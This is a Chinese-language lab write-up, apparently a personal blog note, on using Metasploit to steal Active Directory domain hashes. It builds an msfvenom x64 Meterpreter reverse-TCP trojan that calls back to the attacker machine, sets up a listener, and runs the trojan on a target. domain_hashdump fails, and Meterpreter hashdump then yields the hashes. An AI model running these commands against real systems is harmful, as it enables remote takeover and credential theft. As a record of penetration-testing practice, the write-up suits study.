ailx10说：这篇是2022年1月之前写的，后来又改过。Metasploit 取域散列这回没按预想顺利。普通运行时拿不到，换管理员以后，domain\_hashdump 仍报错，后来直接用 Meterpreter 的 hashdump 才出现结果。我把前后输出都留下，免得最后成功的一张图盖住前面失败的是另一条路线。它提醒我，同一套框架里的模块也有各自前提，名字相近不代表机制和范围完全一样。生成程序、获得会话、再取凭据，是一段段需要分别确认的过程，不是双击以后所有能力就自然都到齐了。

---

MSF生成x64回连程序，普通运行无法取NTDS，管理员运行后domain\_hashdump仍报错；直接Meterpreter hashdump后作者报告域hash。

## 技术条件与证据边界

保留domain\_hashdump失败，不把成功hashdump当同方法；hashdump域或本地范围依DC与模块，实际输出在图，双击不保证任何环境上线。

## 历史实验与原文记录

## 第一步：生成木马文件

- 生成木马（hack.exe）
- 投递到目标服务（windows 192.168.160.143）

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.160.140 -f exe > hack.exe
```

![](/notes-assets/494ba5ab1815756547b1.webp)

## 第二步：监听5555端口

- 通过metasploit监听5555端口

```
use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set lhost 0.0.0.0

set lport 5555
```

![](/notes-assets/3eb3c9b6a011752add5b.webp)

## 第三步：期待鱼儿上钩

- 去目标服务器上双击一下木马（hack.exe）

![](/notes-assets/182600f280a7a8c27f6f.webp)

## 第四步：获得shell会话

- 只要双击（hack.exe），立马控制目标

```
exploit -j -z
```

![](/notes-assets/6c323449a8598ff293ce.webp)

由于是双击的木马，并不是特权账号，导致无法获得`ntds.dit`活动目录文件，也就无法拿到域散列值。所以，我又通过管理员权限运行了木马文件，这回有了。

![](/notes-assets/dc97f5a8ffb8202e4247.webp)

## 第五步：读取`ntds.dit`，解析得到域散列值

```
use windows/gather/credentials/domain_hashdump

set session 3
```

- 遗憾的是，竟然报错，我一个特权账号，竟然拷贝不出来`ntds.dit`

![](/notes-assets/549988417fefaffe71ad.webp)

- 怎么能放弃？继续搞！
- 直接进入shell会话里，hashdump直接拿到所有的域散列值

![](/notes-assets/c0a517d5e77bb56080a3.jpg)
